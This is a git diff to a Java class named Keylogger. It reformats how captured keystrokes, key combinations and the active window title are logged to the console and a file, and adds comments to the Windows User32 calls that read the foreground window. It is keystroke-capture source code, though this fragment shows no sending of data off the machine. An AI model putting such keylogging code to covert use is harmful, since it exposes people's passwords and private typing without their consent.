@@ -94,30 +94,32 @@ public class Keylogger implements NativeKeyListener
         }
     }
 
-    private void logKeyPressedEvent(String keyText)
-    {
+    private void logKeyPressedEvent(String keyText) {
         String dateTime = getCurrentDateTime(LOG_TIME_FORMAT);
         String activeWindowTitle = getActiveWindowTitle();
-        String logText;
-
-        if (currentlyPressedKeys.size() > 1)
-        {
-            logText = dateTime + " - Combination of keys: " + String.join(" + ", currentlyPressedKeys)
-                    + " has been pressed. Active Window: " + activeWindowTitle;
-        } else
-        {
-            logText = dateTime + " - Pressed this key: " + keyText + ". Active Window: " + activeWindowTitle;
+        StringBuilder logText = new StringBuilder(dateTime);
+    
+        // If there's a key combination, display it, otherwise just show the single key pressed
+        if (currentlyPressedKeys.size() > 1) {
+            logText.append(" [Keys: ").append(String.join(" + ", currentlyPressedKeys)).append("]");
+        } else {
+            logText.append(" [Key: ").append(keyText).append("]");
         }
-
-        System.out.println(logText);
-        writeToFile(logText + "\n");
+    
+        // Add active window title
+        logText.append(" [Window: ").append(activeWindowTitle).append("]");
+    
+        String formattedLog = logText.toString();
+        System.out.println(formattedLog);
+        writeToFile(formattedLog + "\n");
     }
+    
 
     private String getActiveWindowTitle()
     {
-        byte[] buffer = new byte[1024];
-        HWND hwnd = User32.INSTANCE.GetForegroundWindow();
-        User32.INSTANCE.GetWindowTextA(hwnd, buffer, 1024);
+        byte buffer[] = new byte[1024];
+        HWND hwnd = User32.INSTANCE.GetForegroundWindow(); // get handle of currently active window
+        User32.INSTANCE.GetWindowTextA(hwnd, buffer, 1024); // get title of currently active window
         return Native.toString(buffer);
     }
 
